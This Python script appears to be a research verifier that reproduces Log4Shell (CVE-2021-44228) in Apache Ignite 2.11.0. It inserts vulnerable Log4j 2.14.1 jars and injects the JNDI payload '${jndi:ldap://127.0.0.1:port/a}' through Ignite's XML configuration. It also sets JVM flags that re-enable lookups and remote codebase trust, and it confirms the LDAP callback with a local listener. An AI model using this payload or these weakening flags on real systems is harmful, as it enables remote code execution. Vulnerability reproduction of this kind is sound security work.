#!/usr/bin/env python3
import argparse
import hashlib
import json
import os
import shutil
import signal
import socket
import subprocess
import threading
import time
import zipfile
from pathlib import Path


SAMPLE_ID = "CVE-2021-44228__apache_ignite_2_11_0_v1_log4j_real_entrypoint"
ROOT = Path("/data/lhq/workspace/ljl-v1-downstream-insertions")
LEGACY_ROOT = Path("/data/lhq/workspace/ljl-strict-redo")
SOURCE_CASE = "log4j/CVE-2021-44228"
SOURCE_V1 = Path("/data/lhq/workspace/ljl-patch-java30-projects/input/log4j/CVE-2021-44228/v1")
M2 = Path("/data/lhq/workspace/ljl-patch-java30-projects/.m2-poc")
ARCHIVE = LEGACY_ROOT / "probes" / "ignite-log4j" / "apache-ignite-slim-2.11.0-bin.zip"
V1_RUNTIME_JARS = {"log4j-api-2.14.1.jar", "log4j-core-2.14.1.jar"}
LOG4J_JARS = {
    "log4j-api-2.14.1.jar": M2 / "org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar",
    "log4j-core-2.14.1.jar": M2 / "org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar",
}


def sha256(path):
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def inspect_core(jar_path):
    result = {
        "path": str(jar_path),
        "exists": jar_path.exists(),
        "jndi_lookup_class_present": False,
        "jndi_manager_class_present": False,
        "version_2_14_1": False,
    }
    if not jar_path.exists():
        return result
    with zipfile.ZipFile(jar_path) as zf:
        names = set(zf.namelist())
        result["jndi_lookup_class_present"] = "org/apache/logging/log4j/core/lookup/JndiLookup.class" in names
        result["jndi_manager_class_present"] = "org/apache/logging/log4j/core/net/JndiManager.class" in names
        props = "META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties"
        if props in names:
            result["version_2_14_1"] = "version=2.14.1" in zf.read(props).decode("utf-8", "replace")
    return result


def replace_log4j(enabled_log4j2):
    before = sorted(p.name for p in enabled_log4j2.glob("log4j-*.jar"))
    copied = {}
    for target_name, source in LOG4J_JARS.items():
        if not source.exists():
            raise FileNotFoundError(source)
        artifact = target_name.rsplit("-", 1)[0]
        for old in enabled_log4j2.glob(f"{artifact}-*.jar"):
            old.unlink()
        target = enabled_log4j2 / target_name
        shutil.copy2(source, target)
        copied[target_name] = {
            "source": str(source),
            "target": str(target),
            "sha256_source": sha256(source),
            "sha256_target": sha256(target),
            "is_generated_v1_runtime_jar": target_name in V1_RUNTIME_JARS,
        }
    after = sorted(p.name for p in enabled_log4j2.glob("log4j-*.jar"))
    return {
        "before": before,
        "copied": copied,
        "after": after,
        "log4j_core": inspect_core(enabled_log4j2 / "log4j-core-2.14.1.jar"),
    }


def ensure_ignite(evidence_dir):
    run_dir = evidence_dir / "runtime"
    if run_dir.exists():
        shutil.rmtree(run_dir)
    run_dir.mkdir(parents=True)
    if not ARCHIVE.exists():
        raise FileNotFoundError(ARCHIVE)
    if not zipfile.is_zipfile(ARCHIVE):
        raise RuntimeError(f"not a valid zip: {ARCHIVE}")
    with zipfile.ZipFile(ARCHIVE) as zf:
        zf.extractall(run_dir)
    dist_dir = run_dir / "apache-ignite-slim-2.11.0-bin"
    for script in (dist_dir / "bin").glob("*"):
        script.chmod(script.stat().st_mode | 0o111)
    optional_log4j2 = dist_dir / "libs" / "optional" / "ignite-log4j2"
    enabled_log4j2 = dist_dir / "libs" / "ignite-log4j2"
    if enabled_log4j2.exists():
        shutil.rmtree(enabled_log4j2)
    shutil.move(str(optional_log4j2), str(enabled_log4j2))
    replacement = replace_log4j(enabled_log4j2)
    return dist_dir, enabled_log4j2, replacement


def start_listener(evidence_dir, case_name, timeout=20):
    received = []
    ready = threading.Event()
    port_box = {}

    def worker():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", 0))
            sock.listen(5)
            sock.settimeout(timeout)
            port_box["port"] = sock.getsockname()[1]
            (evidence_dir / f"{case_name}-listener-port.txt").write_text(
                str(port_box["port"]), encoding="utf-8"
            )
            ready.set()
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                return
            with conn:
                data = conn.recv(256)
                received.append({"addr": repr(addr), "data_hex": data.hex(), "data_repr": repr(data)})
                try:
                    conn.sendall(bytes([48, 12, 2, 1, 1, 101, 7, 10, 1, 0, 4, 0, 4, 0]))
                except OSError:
                    pass

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    if not ready.wait(3):
        raise RuntimeError("listener did not start")
    return port_box["port"], received, thread


def write_probe_config(dist_dir, payload, case_name):
    config = f"""<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<beans xmlns=\"http://www.springframework.org/schema/beans\"
       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
       xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">
  <bean id=\"grid.cfg\" class=\"org.apache.ignite.configuration.IgniteConfiguration\">
    <property name=\"igniteInstanceName\" value=\"{payload}\"/>
    <property name=\"gridLogger\">
      <bean class=\"org.apache.ignite.logger.log4j2.Log4J2Logger\">
        <constructor-arg type=\"java.lang.String\" value=\"config/ignite-log4j2.xml\"/>
      </bean>
    </property>
  </bean>
</beans>
"""
    config_path = dist_dir / "config" / f"strict-log4j2-{case_name}.xml"
    config_path.write_text(config, encoding="utf-8")
    return config_path


def run_ignite(dist_dir, evidence_dir, case_name, payload, timeout=20):
    config_path = write_probe_config(dist_dir, payload, case_name)
    cmd = [
        str(dist_dir / "bin" / "ignite.sh"),
        "-v",
        "-J-Dlog4j2.formatMsgNoLookups=false",
        "-J-Dcom.sun.jndi.ldap.object.trustURLCodebase=true",
        str(config_path.relative_to(dist_dir)),
    ]
    env = os.environ.copy()
    env["JAVA_HOME"] = env.get("STRICT_IGNITE_JAVA_HOME", "/data/lhq/.sdkman/candidates/java/8.0.452-amzn")
    env["JVM_OPTS"] = "-Xms256m -Xmx512m -server -XX:MaxMetaspaceSize=128m"
    started = time.time()
    proc = subprocess.Popen(
        cmd,
        cwd=str(dist_dir),
        env=env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        preexec_fn=os.setsid,
    )
    try:
        output, _ = proc.communicate(timeout=timeout)
    except subprocess.TimeoutExpired:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        try:
            output, _ = proc.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            output, _ = proc.communicate(timeout=5)
    duration = round(time.time() - started, 3)
    (evidence_dir / f"{case_name}-ignite.out").write_text(output, encoding="utf-8")
    return {
        "case": case_name,
        "cmd": cmd,
        "returncode": proc.returncode,
        "duration_seconds": duration,
        "config": str(config_path),
        "stdout_contains_payload": payload in output,
        "stdout_contains_log4j2": "log4j2" in output.lower() or "Log4J2Logger" in output,
        "stdout_contains_ignite_start": "Ignite ver. 2.11.0" in output,
        "stdout_contains_mbean_payload_error": "MalformedObjectNameException" in output and "Invalid character ':'" in output,
        "stdout_tail": output[-5000:],
    }


def run_case(evidence_dir, run_dir, case_name, payload_factory):
    port, received, thread = start_listener(evidence_dir, case_name)
    payload = payload_factory(port) if callable(payload_factory) else payload_factory
    ignite_result = run_ignite(run_dir, evidence_dir, case_name, payload)
    thread.join(3)
    return {
        "case": case_name,
        "payload": payload,
        "listener_port": port,
        "listener_received_count": len(received),
        "listener_received": received,
        "ignite_result": ignite_result,
    }


def main():
    global ROOT
    parser = argparse.ArgumentParser()
    parser.add_argument("--workdir", default=str(ROOT))
    parser.add_argument("--fresh", action="store_true")
    args = parser.parse_args()

    ROOT = Path(args.workdir)
    sample_dir = ROOT / "samples" / SAMPLE_ID
    evidence_dir = sample_dir / "evidence"
    if args.fresh and evidence_dir.exists():
        shutil.rmtree(evidence_dir)
    evidence_dir.mkdir(parents=True, exist_ok=True)
    run_log = evidence_dir / "run.log"
    run_log.write_text("", encoding="utf-8")

    run_dir, enabled_log4j2, replacement = ensure_ignite(evidence_dir)
    jars = sorted(str(p.relative_to(run_dir)) for p in enabled_log4j2.glob("*.jar"))
    dep = {
        "artifact": str(ARCHIVE),
        "source_case": SOURCE_CASE,
        "source_v1": str(SOURCE_V1),
        "insertion_model": (
            "isolated runtime dependency insertion: official Apache Ignite 2.11.0 slim binary; "
            "the documented optional ignite-log4j2 module is enabled, then generated v1 Log4j "
            "2.14.1 api/core jars are copied from .m2-poc into libs/ignite-log4j2"
        ),
        "enabled_module": str(enabled_log4j2),
        "runtime_replacement": replacement,
        "runtime_log4j2_module_jars_after_insertion": jars,
    }
    (evidence_dir / "dependency-evidence.json").write_text(
        json.dumps(dep, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    (evidence_dir / "dependency-evidence.txt").write_text("\n".join(jars) + "\n", encoding="utf-8")

    positive = run_case(
        evidence_dir,
        run_dir,
        "positive",
        lambda port: "${jndi:ldap://127.0.0.1:%d/a}" % port,
    )
    negative = run_case(evidence_dir, run_dir, "negative", "strict-negative-control")

    confirmed = (
        positive["listener_received_count"] > 0
        and negative["listener_received_count"] == 0
        and all(
            name in replacement["copied"]
            and replacement["copied"][name]["is_generated_v1_runtime_jar"]
            for name in V1_RUNTIME_JARS
        )
        and replacement["log4j_core"]["version_2_14_1"]
        and replacement["log4j_core"]["jndi_lookup_class_present"]
        and replacement["log4j_core"]["jndi_manager_class_present"]
        and positive["ignite_result"]["stdout_contains_payload"]
        and positive["ignite_result"]["stdout_contains_log4j2"]
        and positive["ignite_result"]["stdout_contains_ignite_start"]
        and negative["ignite_result"]["stdout_contains_payload"]
        and negative["ignite_result"]["stdout_contains_log4j2"]
        and negative["ignite_result"]["stdout_contains_ignite_start"]
    )
    result = {
        "sample_id": SAMPLE_ID,
        "status": "TP_CONFIRMED_REAL_DOWNSTREAM_ENTRYPOINT" if confirmed else "FAILED",
        "strict_status": "TP_CONFIRMED" if confirmed else "FAILED",
        "source_case": SOURCE_CASE,
        "source_v1_path": str(SOURCE_V1),
        "cve": "CVE-2021-44228",
        "downstream_repo": "apache/ignite",
        "downstream_application": "Apache Ignite 2.11.0 slim binary",
        "downstream_entrypoint": "bin/ignite.sh real startup with Ignite XML configuration",
        "downstream": "Apache Ignite 2.11.0 slim binary",
        "upstream_library": "log4j",
        "vulnerable_version": "2.14.1",
        "artifact": str(ARCHIVE),
        "dependency_evidence": dep,
        "dependency_evidence_file": str(evidence_dir / "dependency-evidence.json"),
        "attack_surface": "Ignite bin/ignite.sh startup with official Log4J2Logger module and IgniteConfiguration.igniteInstanceName",
        "payload": positive["payload"],
        "positive": positive,
        "negative": negative,
        "dynamic_signal": {
            "positive_listener_received_count": positive["listener_received_count"],
            "positive_listener_received": positive["listener_received"],
            "positive_ignite_result": positive["ignite_result"],
            "negative_listener_received_count": negative["listener_received_count"],
            "negative_listener_received": negative["listener_received"],
            "negative_ignite_result": negative["ignite_result"],
            "generated_v1_jars_inserted": all(name in replacement["copied"] for name in V1_RUNTIME_JARS),
            "jndi_lookup_class_present": replacement["log4j_core"]["jndi_lookup_class_present"],
            "jndi_manager_class_present": replacement["log4j_core"]["jndi_manager_class_present"],
        },
        "not_cve_poc_local": True,
        "not_runner_only": True,
        "dynamic_evidence": str(evidence_dir / "probe.json"),
        "run_rc": str(evidence_dir / "run.rc"),
        "verifier": str(ROOT / "scripts" / "verify_ignite_log4j_v1_inserted.py"),
        "notes": (
            "The verifier does not execute .cve_poc_local. It enables Ignite's documented optional "
            "ignite-log4j2 module in an isolated official Ignite runtime, inserts the generated v1 "
            "Log4j api/core 2.14.1 jars into that module, and triggers Log4Shell through Ignite's "
            "real XML configuration startup path."
        ),
    }
    (sample_dir / "manifest.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "probe.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "run.rc").write_text(
        f"RUN_RC={0 if confirmed else 1}\n"
        f"status={result['strict_status']}\n"
        f"positive_listener_received_count={positive['listener_received_count']}\n"
        f"negative_listener_received_count={negative['listener_received_count']}\n"
        f"jndi_lookup_class_present={int(replacement['log4j_core']['jndi_lookup_class_present'])}\n"
        f"jndi_manager_class_present={int(replacement['log4j_core']['jndi_manager_class_present'])}\n"
        f"positive_stdout_contains_payload={int(positive['ignite_result']['stdout_contains_payload'])}\n"
        f"negative_stdout_contains_payload={int(negative['ignite_result']['stdout_contains_payload'])}\n",
        encoding="utf-8",
    )
    (sample_dir / "README.md").write_text(
        f"# {SAMPLE_ID}\n\n"
        "This is a strict insertion sample. The verifier unpacks the official Apache Ignite 2.11.0 slim "
        "binary into an isolated runtime, enables the documented `ignite-log4j2` runtime module, and copies "
        "generated v1 Log4j 2.14.1 `api` and `core` jars from `.m2-poc` into that module.\n\n"
        "The positive run starts `bin/ignite.sh` with a real Ignite XML configuration containing "
        "`${jndi:ldap://127.0.0.1:<port>/a}` in `igniteInstanceName`; the negative run uses the same "
        "startup path with a control value. Positive must produce one LDAP bind and negative must produce none.\n\n"
        "Run: `python3 scripts/verify_ignite_log4j_v1_inserted.py` from `/data/lhq/workspace/ljl-v1-downstream-insertions`.\n",
        encoding="utf-8",
    )
    print(json.dumps(result, indent=2, sort_keys=True))
    raise SystemExit(0 if confirmed else 1)


if __name__ == "__main__":
    main()
